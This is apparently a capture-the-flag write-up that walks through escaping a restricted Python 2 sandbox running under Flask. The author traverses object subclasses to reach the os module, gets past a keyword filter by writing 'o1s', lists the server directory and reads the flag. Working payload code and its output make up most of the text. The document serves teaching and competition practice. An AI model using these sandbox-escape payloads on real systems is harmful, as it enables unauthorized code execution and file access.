# Python Learning Environment - 60 points

After some Google search we have found a way to get all imported modules:

```Python
all_modules = ().__class__.__base__.__subclasses__()
print(all_modules)
```
Result:
```
> [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'uwsgi._Input'>, <type 'uwsgi.SymbolsImporter'>, <type 'uwsgi.ZipImporter'>, <type 'uwsgi.SymbolsZipImporter'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <class 'string.Template'>, <class 'string.Formatter'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <type 'time.struct_time'>, <class 'email.LazyImporter'>, <type 'Struct'>, <type '_hashlib.HASH'>, <type '_random.Random'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <type 'method_descriptor'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <class 'calendar.Calendar'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'werkzeug.urls.Href'>, <class 'werkzeug.wsgi.ProxyMiddleware'>, <class 'werkzeug.wsgi.SharedDataMiddleware'>, <class 'werkzeug.wsgi.DispatcherMiddleware'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.wrappers.BaseRequest'>, <class 'werkzeug.wrappers.BaseResponse'>, <class 'werkzeug.wrappers.AcceptMixin'>, <class 'werkzeug.wrappers.ETagRequestMixin'>, <class 'werkzeug.wrappers.UserAgentMixin'>, <class 'werkzeug.wrappers.AuthorizationMixin'>, <class 'werkzeug.wrappers.StreamOnlyMixin'>, <class 'werkzeug.wrappers.ETagResponseMixin'>, <class 'werkzeug.wrappers.ResponseStream'>, <class 'werkzeug.wrappers.ResponseStreamMixin'>, <class 'werkzeug.wrappers.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.WWWAuthenticateMixin'>, <class 'werkzeug.exceptions.Aborter'>, <type '_json.Scanner'>, <type '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'threading._Verbose'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.nodes.Node'>, <class 'numbers.Number'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal._ContextManager'>, <class 'decimal.Context'>, <class 'decimal._WorkRep'>, <class 'decimal._Log10Memoize'>, <type '_ast.AST'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'difflib.HtmlDiff'>, <class 'uuid.UUID'>, <type 'CArgObject'>, <type '_ctypes.CThunkObject'>, <type '_ctypes._CData'>, <type '_ctypes.CField'>, <type '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <type 'select.epoll'>, <class 'subprocess.Popen'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'ast.NodeVisitor'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'itsdangerous._json._CompactJSON'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'logging.LogRecord'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.wrappers.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <type 'tupleiterator'>]
```
Then we tried:
```python
all_modules = ().__class__.__base__.__subclasses__()
for i in all_modules:
  try:
    print(i()._module)
  except:
    pass
```
Result:
```
> <module 'warnings' from '/usr/local/lib/python2.7/warnings.pyc'>
> <werkzeug.urls.Href object at 0x7f78777d32d0>
```
`warnings` imports `linecache` wich imports `os`.

```python
all_modules = ().__class__.__base__.__subclasses__()
for i in all_modules:
  try:
    print(i()._module.linecache)
  except:
    pass
```
Result:
```
> <module 'linecache' from '/usr/local/lib/python2.7/linecache.pyc'>
> <werkzeug.urls.Href object at 0x7f78778220d0>
```
Importing `os` bypassing with `o1s`:

```python
all_modules = ().__class__.__base__.__subclasses__()
for i in all_modules:
  try:
    print(i()._module.linecache.o1s)
  except:
    pass
```
Result:
```
> <module 'os' from '/usr/local/lib/python2.7/os.pyc'>
> <werkzeug.urls.Href object at 0x7f420132e090>
```
Now we have access to all methods from `os`.

```python
all_modules = ().__class__.__base__.__subclasses__()
for i in all_modules:
  try:
    print(i()._module.linecache.o1s.getcwd())
  except:
    pass
```

Result:

```
> /app
> _module/linecache/os/getcwd
```

```python
all_modules = ().__class__.__base__.__subclasses__()
for i in all_modules:
  try:
    print(i()._module.linecache.o1s.listdir('../app'))
  except:
    pass
```

Result:

```
> ['$(ls)', '1', '2', '3', '4', '5', '6', '7', '8', '`ls`', 'app.conf', 'app.ini', 'app.py', 'app.pyc', 'build-flask.sh', 'build-nginx.sh', 'deployment-ns-challs.yml', 'deployment.yml', 'docker-compose.yml', 'Dockerfile-flask', 'Dockerfile-nginx', 'F#{PyTh0n_Pr1s0n_br3aK}', 'index.html', 'index.html.1', 'index.html.2', 'index.html.3', 'index.html.4', 'index.html.5', 'nc', 'postb.in', 'README.md', 'redeploy.sh', 'requirements.txt', 'st-data', 'static', 'templates', 'test', 'test.sh', 'vKvqSQcp', 'xpl.py']
> _module/linecache/os/app
```

Flag: `F#{PyTh0n_Pr1s0n_br3aK}`
